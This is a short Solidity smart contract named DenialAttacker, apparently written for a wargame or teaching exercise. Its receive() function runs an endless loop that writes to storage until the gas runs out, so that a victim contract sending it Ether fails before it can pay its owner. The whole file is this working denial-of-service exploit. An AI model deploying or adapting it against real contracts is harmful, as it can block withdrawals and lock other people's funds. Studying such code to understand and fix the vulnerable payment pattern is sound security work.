// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract DenialAttacker {
    address[] private addresses;
    receive() external payable {
        // exhaust gas, so no sufficient gas for transfer to owner
        while(true) {
            addresses.push(msg.sender);
        }
    }
}